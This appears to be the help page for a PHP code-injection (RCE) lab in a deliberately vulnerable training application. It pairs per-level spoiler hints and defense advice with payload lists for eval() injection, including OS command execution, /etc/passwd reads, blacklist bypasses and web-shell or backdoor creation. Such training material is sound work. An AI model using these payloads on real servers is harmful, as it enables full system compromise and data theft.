<div class="body_padded">
	<h1>Help - Remote Code Execution (RCE)</h1>

	<div id="code">
		<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
			<tr>
				<td><div id="code">
					<h3>About</h3>
					<p>Remote Code Execution (RCE) is one of the most critical vulnerabilities that allows an attacker to execute arbitrary code on the target system. This can lead to complete system compromise, data theft, and further attacks on the infrastructure.</p>
					
					<p>In this module, RCE occurs through PHP code injection when user input is directly passed to eval() or similar dangerous functions without proper validation. This allows attackers to break out of the intended context and execute arbitrary PHP code on the server.</p>

					<h3>How PHP Code Injection Works</h3>
					<p>When applications use functions like eval() with user input, attackers can inject PHP code by:</p>
					<ul>
						<li><strong>Breaking out of strings:</strong> Using quotes to close strings and inject new code</li>
						<li><strong>Using semicolons:</strong> Terminating statements to add new ones</li>
						<li><strong>Variable manipulation:</strong> Creating temporary variables to structure valid syntax</li>
						<li><strong>Function calls:</strong> Calling dangerous PHP functions like system(), exec(), shell_exec()</li>
						<li><strong>File operations:</strong> Reading/writing files with file_get_contents(), fopen(), etc.</li>
					</ul>

					<h3>PHP Code Injection Basics</h3>
					<p>Common techniques to inject PHP code into eval() contexts:</p>
					<pre>'; phpinfo(); $x='           # Break string, execute phpinfo(), continue string
'; system('whoami'); $x='    # Execute OS commands via system()
'; echo shell_exec('id'); '  # Execute commands via shell_exec()
'; echo `whoami`; $x='       # Execute using backticks
'; passthru('ls -la'); '     # Execute using passthru()
'; print_r(scandir('.')); '  # List directory contents</pre>

					<h3>Advanced Bypass Techniques (Without Semicolons)</h3>
					<p>When semicolons are blocked, use string concatenation operators:</p>
					<pre>' . `whoami` . '             # String concatenation with backticks
' . `id` . '                  # Execute id command via backticks
' . `ls -la` . '              # Execute ls command
' . `cat /etc/passwd` . '     # Read files using command execution
' . print_r(scandir('.')) . ' # List directory without semicolon
' . phpinfo() . '             # Call phpinfo without semicolon</pre>

					<h3>Common RCE Payloads</h3>
					<p><strong>Information Gathering:</strong></p>
					<pre>'; phpinfo(); $x='
'; var_dump(get_defined_functions()); '
'; echo php_uname(); $x='
'; echo getcwd(); '</pre>

					<p><strong>Command Execution:</strong></p>
					<pre>'; echo shell_exec("whoami"); $x='
'; system("id"); $x='
'; echo `uname -a`; $x='
'; passthru("ls -la"); '</pre>

					<p><strong>File Operations:</strong></p>
					<pre>'; echo file_get_contents("/etc/passwd"); '
'; print_r(scandir("/var/www")); '
'; readfile("/etc/hosts"); $x='
'; file_put_contents("shell.php", "&lt;?php system(\$_GET['c']); ?&gt;"); '</pre>

					<p><strong>Advanced Exploitation:</strong></p>
					<pre>'; eval($_GET["c"]); $x='     # Create backdoor for further commands
'; $a=$_GET; system($a[0]); ' # Use variable indirection
'; assert($_POST["x"]); '     # Alternative code execution method</pre>

					<h3>Impact</h3>
					<ul>
						<li><strong>Complete System Compromise:</strong> Full control over the server</li>
						<li><strong>Data Breach:</strong> Access to all data on the system</li>
						<li><strong>Privilege Escalation:</strong> Gaining root/admin access</li>
						<li><strong>Lateral Movement:</strong> Moving to other systems in the network</li>
						<li><strong>Malware Installation:</strong> Installing persistent backdoors</li>
						<li><strong>Service Disruption:</strong> Crashing or disabling services</li>
					</ul>

					<br /><hr /><br />

					<h3>Objective</h3>
					<p>Your goal is to exploit the RCE vulnerability to:</p>
					<ul>
						<li><strong>Low:</strong> Execute PHP code through eval() injection</li>
						<li><strong>Medium:</strong> Bypass basic function name blacklist</li>
						<li><strong>High:</strong> Bypass extensive blacklist and semicolon restriction</li>
						<li><strong>Impossible:</strong> Understand proper code injection prevention</li>
					</ul>

					<br /><hr /><br />

					<h3>Low Level</h3>
					<p>The low level directly passes user input into eval() without any validation, creating a fully exploitable code injection vulnerability.</p>
					<p><em>Spoiler:</em> <span class="spoiler">Break out of the string context and inject PHP code. Try: '; phpinfo(); $x=' or '; echo shell_exec("whoami"); $x=' or '; system("id"); $x='</span></p>

					<br />

					<h3>Medium Level</h3>
					<p>The medium level implements a basic function name blacklist blocking: eval, exec, system, passthru, shell_exec, phpinfo, popen, proc_open.</p>
					<p><em>Spoiler:</em> <span class="spoiler">The blacklist only blocks specific functions, but backticks and many other methods remain available. Try backticks: '; echo `whoami`; $x=' or file operations: '; echo file_get_contents("/etc/passwd"); $x=' or '; print_r(scandir(".")); $x='</span></p>

					<br />

					<h3>High Level</h3>
					<p>The high level implements an extensive function blacklist blocking most dangerous functions (eval, exec, system, shell_exec, file operations, encoding functions, superglobals) and also blocks semicolons to make exploitation more difficult.</p>
					<p><em>Spoiler:</em> <span class="spoiler">Semicolons are blocked, but you can still use string concatenation with backticks for command execution. Try: ' . `whoami` . ' or ' . `id` . ' or use call_user_func with string concatenation: ' . call_user_func('scandir', '.')[0] . ' (but this requires careful syntax). The easiest method is backticks with concatenation operator.</span></p>

					<br />

					<h3>Impossible Level</h3>
					<p>The impossible level properly prevents code injection by:</p>
					<ul>
						<li>Using CSRF token protection</li>
						<li><strong>Never using eval() or similar dangerous functions</strong></li>
						<li>Avoiding dynamic code execution entirely</li>
						<li>Using simple string concatenation instead of eval()</li>
						<li>Properly escaping all output with htmlspecialchars()</li>
						<li>Validating input with strict whitelist regex</li>
						<li>Treating user input as data, never as code</li>
					</ul>
					<p>This is the recommended approach for preventing PHP code injection.</p>

					<br />

					<h3>Defense Strategies</h3>
					<ul>
						<li><strong>Never use eval():</strong> Avoid eval(), assert(), create_function() with user input</li>
						<li><strong>Disable dangerous functions:</strong> Disable eval, exec, system, passthru, shell_exec in php.ini (disable_functions)</li>
						<li><strong>Input validation:</strong> Strict whitelist validation for all user inputs</li>
						<li><strong>Output encoding:</strong> Always escape output with htmlspecialchars(), htmlentities()</li>
						<li><strong>Least privilege:</strong> Run PHP processes with minimal permissions</li>
						<li><strong>Code review:</strong> Regular security audits of code using dangerous functions</li>
						<li><strong>Static analysis:</strong> Use tools to detect eval(), exec(), and similar functions</li>
						<li><strong>Sandboxing:</strong> Isolate PHP execution in containers or restricted environments</li>
						<li><strong>WAF protection:</strong> Use Web Application Firewalls to detect injection attempts</li>
						<li><strong>Security updates:</strong> Keep PHP and all libraries up to date</li>
					</ul>

					<br />

					<h3>Testing Tips</h3>
					<ul>
						<li><strong>Basic detection:</strong> Try simple injections: '; phpinfo(); '</li>
						<li><strong>String manipulation:</strong> Test different quote types: single quotes, double quotes</li>
						<li><strong>Function discovery:</strong> Use get_defined_functions() to see available functions</li>
						<li><strong>Alternative execution:</strong> Try backticks, system(), exec(), passthru(), shell_exec()</li>
						<li><strong>File operations:</strong> Test file_get_contents(), readfile(), scandir()</li>
						<li><strong>Time-based detection:</strong> Use sleep() or usleep() for blind code injection</li>
						<li><strong>Error messages:</strong> Trigger errors to reveal information about the execution context</li>
						<li><strong>Automation:</strong> Use Burp Suite, OWASP ZAP for testing</li>
					</ul>

					<br />

					<h3>Real-world Examples</h3>
					<ul>
						<li><strong>PHP-CGI (2012):</strong> CVE-2012-1823 - Query string parameter injection leading to RCE</li>
						<li><strong>WordPress (2017):</strong> PHPMailer RCE - Code injection through email headers</li>
						<li><strong>Drupal (2018):</strong> Drupalgeddon2 - Remote code execution in Drupal 7.x and 8.x</li>
						<li><strong>Laravel (2021):</strong> Debug mode RCE - Code execution through exposed debug information</li>
						<li><strong>SolarWinds (2020):</strong> Supply chain attack with RCE capabilities</li>
					</ul>

					<br />

					<h3>References</h3>
					<ul>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://owasp.org/www-community/attacks/Code_Injection', 'OWASP - Code Injection' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://portswigger.net/web-security/code-injection', 'PortSwigger - Code Injection' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://www.php.net/manual/en/function.eval.php', 'PHP Manual - eval() Function' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection', 'OWASP - PHP Object Injection' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Code%20Injection', 'PayloadsAllTheThings - Code Injection' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html', 'OWASP - PHP Configuration Cheat Sheet' ); ?></li>
					</ul>
				</div></td>
			</tr>
		</table>
	</div>
</div>
